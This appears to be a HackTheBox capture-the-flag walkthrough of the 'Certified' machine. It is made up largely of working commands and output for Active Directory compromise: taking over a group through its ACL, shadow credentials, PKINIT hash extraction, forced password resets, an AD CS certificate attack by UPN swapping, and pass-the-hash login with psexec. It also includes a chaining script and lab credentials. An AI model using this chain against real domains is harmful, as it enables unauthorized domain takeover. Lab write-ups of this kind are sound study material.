![image 82.png](assets/Certified/image%2082.png)
![image 1 49.png](assets/Certified/image%201%2049.png)
![image 2 49.png](assets/Certified/image%202%2049.png)
Domain:
  
10.10.11.41
![](assets/Certified/Screenshot_from_2024-11-02_22-49-36.png)
judith.mader:judith09
  
![image 3 43.png](assets/Certified/image%203%2043.png)
service account is kerberoastable
  
![image 4 39.png](assets/Certified/image%204%2039.png)
hash got exhausted 😟
  
judith.mader has write ownership over management
![](assets/Certified/Screenshot_from_2024-11-03_00-46-26.png)
  
can use [owneredit.py](http://owneredit.py) to change the ownership of management
- [owneredit.py](http://owneredit.py/) -action write -new-owner 'judith.mader' -target 'management' 'CERTIFIED'/'judith.mader':'judith09'
  
from there, we give judith.mader full control over the group
- impacket-dacledit -action 'write' -rights 'FullControl' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' -inheritance "CERTIFIED"/"judith.mader":"judith09" -dc-ip 10.10.11.41
![image 5 38.png](assets/Certified/image%205%2038.png)
![image 6 34.png](assets/Certified/image%206%2034.png)
- we did this to grant ourselves the “Add Member” privilege
  
net rpc group addmem "Management" "judith.mader" -U "CERTIFIED"/"judith.mader"%"judith09" -S "dc01.CERTIFIED.HTB”
- add judith.mader to the group
![image 7 33.png](assets/Certified/image%207%2033.png)
![image 8 30.png](assets/Certified/image%208%2030.png)
- now 2 members of the Management Group
  
script to do all of the above quickly
```Bash
#!/bin/bash
python3 bloodyAD.py --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' -inheritance "CERTIFIED"/"judith.mader":"judith09" -dc-ip 10.10.11.41
net rpc group addmem 'Management' 'judith.mader' -U 'CERTIFIED'/'judith.mader'%'judith09' -S 'dc01.CERTIFIED.HTB'
```
  
pywhisker add judith.mader to shadow credentials for management_svc
- python3 [pywhisker.py](http://pywhisker.py/) --action add -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.10.11.41 -t 'management_svc'
    
    - this put a pfx file into the pywhisker folder, put that into the PKINITtools folder
    
https://github.com/dirkjanm/PKINITtools
password found in pywhisker output
- nk3KJ5SRJjaZx7NK6j1K
![image 9 30.png](assets/Certified/image%209%2030.png)
  
export it
- export KRB5CCNAME=man_svc.ccache
  
get the key from the [gettgtpkinit.py](http://gettgtpkinit.py) output
![image 10 25.png](assets/Certified/image%2010%2025.png)
- python3 [gettgtpkinit.py](http://gettgtpkinit.py) certified.htb/management_svc -cert-pfx vuj4P1FP.pfx -pfx-pass <pass>
- be48fbc424fb8817e835896e674785a88c94aedf3bc4ff93fcf880774c8752e6
  
![image 11 24.png](assets/Certified/image%2011%2024.png)
- python3 [getnthash.py](http://getnthash.py) <DOMAIN>/<target_user> -key <key>
- NT Hash: a091c1832bcdd4677c28b5a6a1295584
  
management_svc has GenericAll permissions against ca_operator
![image 12 18.png](assets/Certified/image%2012%2018.png)
  
Get full control over ca_operator
![image 13 18.png](assets/Certified/image%2013%2018.png)
![image 14 17.png](assets/Certified/image%2014%2017.png)
- impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'ca_operator' -target-dn 'CN=  
    OPERATOR CA,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb/management_svc' -k -no-pass -dc-ip 10.10.11.41
  
change the password of ca_operator
- python3 [bloodyAD.py](http://bloodyad.py/) --host 'dc01.certified.htb' -d certified.htb -k -u 'management_svc' set password 'ca_operator' 'Password1'
![image 15 15.png](assets/Certified/image%2015%2015.png)
  
it worked!
![image 16 13.png](assets/Certified/image%2016%2013.png)
  
CA_Operator (Certificate Authority) → probably vulnerable to an ESC attack
- check with certipy
  
![image 17 11.png](assets/Certified/image%2017%2011.png)
![image 18 10.png](assets/Certified/image%2018%2010.png)
- certipy-ad find -dc-ip 10.10.11.41 -vulnerable -stdout -u ca_operator@certified.htb -p ‘Password1’
- it also tells us that “operator ca” has enrollment rights
    
    - that’s how we know that we need ca_operator
    
![image 19 9.png](assets/Certified/image%2019%209.png)
  
update User Principal Name of ca_operator to Administrator
![image 20 8.png](assets/Certified/image%2020%208.png)
- certipy-ad account update -username <user>@<DOMAIN> -password <pass> -user <user> -upn Administrator
- this works because their UPN is Administrator, while the admin user is Administrator@certified.htb
  
request the CertifiedAuthentication template and get administrator.pfx
- certipy-ad req -username ca_operator@certified.htb -p Password1 -ca certified-DC01-CA -template CertifiedAuthentication
![image 21 8.png](assets/Certified/image%2021%208.png)
  
have to change the upn back to ca_operator@certified.htb
- certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
![image 22 7.png](assets/Certified/image%2022%207.png)
  
get the admin hash
- certipy-ad auth -pfx administrator.pfx -domain certified.htb
- aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
![image 23 6.png](assets/Certified/image%2023%206.png)
  
log in with psexec
- impacket-psexec certified.htb/administrator@10.10.11.41 -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34’
![image 24 5.png](assets/Certified/image%2024%205.png)